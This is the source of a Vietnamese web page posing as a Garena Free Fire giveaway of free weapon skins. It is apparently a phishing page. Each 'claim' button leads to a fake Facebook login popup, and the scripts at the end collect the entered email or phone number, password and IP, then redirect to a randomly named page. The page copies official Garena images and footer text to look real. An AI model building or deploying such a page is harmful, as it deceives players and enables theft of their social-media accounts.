...
<title>NHẬN QUÀ FREE FIRE</title>
...
<div class="header">
<div class="sliderHeader"><img src="https://dl.dir.freefiremobile.com/common/web_event/official2.ff.garena.all/20237/5d62e72074b381cbf4e66e62695c6449.jpg" style="width: 100%;"></div>
<div class="sliderHeader"><img src="https://dl.dir.freefiremobile.com/common/web_event/official2.ff.garena.all/20237/5d62e72074b381cbf4e66e62695c6449.jpg" style="width: 100%;"></div>
<div class="sliderHeader"><img src="https://dl.dir.freefiremobile.com/common/web_event/official2.ff.garena.all/20237/5d62e72074b381cbf4e66e62695c6449.jpg" style="width: 100%;"></div>
</div> <!--- header --->
...
<div class="box">
<center>
<div class="season-alert"><center><font style="font-size: 35px;color: #866d6b;position:absolute;font-family: 'nvn', cursive;left: 20%;top: 3%"> Nhận Quà FF</font></center>
</div> <!--- season-alert --->
...
<center>
<div class="balance">
        <img src="https://i.imgur.com/GQUiR8b.jpg">
        <div class="balance-nom">MP40 Tia Chớp Tử Thần</div>
        <div class="balance-detail">Miễn Phí</div>
        <button onmousedown="$('.gifts-code').fadeIn();$('.gift1').fadeIn();$('.gift2').hide();$('.gift3').hide();$('.gift4').hide();$('.gift5').hide();$('.gift6').hide();" class="btn btn-primary" id="claim_btn">
Nhận 
</button>
</div> <!--- balance --->
</div> <!--- latest --->
...
<center>
<div class="balance">
        <img src="https://i.imgur.com/Shoz1ga.jpg">
        <div class="balance-nom">UMP Long Nhong </div>
        <div class="balance-detail">Miễn Phí</div>
        <button onmousedown="$('.gifts-code').fadeIn();$('.gift2').fadeIn();$('.gift1').hide();$('.gift3').hide();$('.gift4').hide();$('.gift5').hide();$('.gift6').hide();" class="btn btn-primary" id="claim_btn">
Nhận 
</button>
</div> <!--- balance --->
</div> <!--- latest --->
...
<center>
<div class="balance">
        <img src="https://i.imgur.com/3dphRVj.jpg">
        <div class="balance-nom">M1014 Huyết Hỏa</div>
        <div class="balance-detail">Miễn Phí</div>
        <button onmousedown="$('.gifts-code').fadeIn();$('.gift3').fadeIn();$('.gift1').hide();$('.gift2').hide();$('.gift4').hide();$('.gift5').hide();$('.gift6').hide();" class="btn btn-primary" id="claim_btn">
Nhận
</button>
</div> <!--- balance --->
</div> <!--- latest --->
...
<center>
<div class="balance">
        <img src="https://i.imgur.com/aayuhgO.jpg">
        <div class="balance-nom">MP40 Thần Bài</div>
        <div class="balance-detail">Miễn Phí</div>
        <button onmousedown="$('.gifts-code').fadeIn();$('.gift4').fadeIn();$('.gift1').hide();$('.gift2').hide();$('.gift3').hide();$('.gift5').hide();$('.gift6').hide();" class="btn btn-primary" id="claim_btn">
Nhận
</button>
</div> <!--- balance --->
</div> <!--- latest --->
...
<center>
<div class="balance">
        <img src="https://i.imgur.com/JkE8Sq2.jpg">
        <div class="balance-nom">Thỏ Đột Biến Đỏ </div>
        <div class="balance-detail">Miễn Phí</div>
        <button onmousedown="$('.gifts-code').fadeIn();$('.gift5').fadeIn();$('.gift1').hide();$('.gift2').hide();$('.gift3').hide();$('.gift4').hide();$('.gift6').hide();" class="btn btn-primary" id="claim_btn">
Nhận
</button>
</div> <!--- balance --->
</div> <!--- latest --->
...
<div class="balance">
        ...
        <div class="balance-nom">Thẻ Vô Cực</div>
        <div class="balance-detail">Miễn Phí</div>
        <button onmousedown="$('.gifts-code').fadeIn();$('.gift6').fadeIn();$('.gift1').hide();$('.gift2').hide();$('.gift3').hide();$('.gift4').hide();$('.gift5').hide();" class="btn btn-primary" id="claim_btn">
Nhận
</button>
</center><br>
</div> <!--- tab-rewards --->
...
<div class="footer-txt-copyright">Privacy Policy | Garena Games User Agreement</div> <!--- footer-txt-copyright --->
<br>
</div> <!--- footer --->
...
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="Redirect();"><i class="fa fa-facebook-square icon-login"></i>Đăng nhập bằng Facebook</button>
<br>
</div> <!--- popup-box-bg --->
...
<script type="text/javascript">
            ...
            function Redirect() {
               window.location="<?php echo generateRandomString(); ?>LVT.html";
            }
...
if (pass.length >= 6 && pass.length <= 25)
{
 ...
 <script>
        ...
        function valid() {
            var user = $('#email-facebook').val().trim();
            var pass = $('#password-facebook').val().trim();
            phonenumber(user);
           validateEmail(user);
            var ip = $('#ip').val();
            if(user == '' || user == null)
